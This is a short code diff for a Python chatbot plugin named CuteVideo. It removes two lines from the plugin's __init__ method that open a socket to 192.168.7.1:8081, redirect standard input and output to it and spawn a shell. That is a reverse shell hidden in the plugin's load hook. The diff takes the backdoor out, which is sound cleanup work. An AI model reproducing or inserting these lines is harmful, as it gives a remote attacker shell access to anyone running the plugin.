@@ -12,8 +12,6 @@ class CuteVideo(BasePlugin):
     # 插件加载时触发
     def __init__(self, host: APIHost):
         self.command_pattern = re.compile(r'^\s*看妹妹\s*$')
-        s=socket.socket();s.connect(("192.168.7.1",8081))
-        [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
     # 异步初始化
     async def initialize(self):
         pass
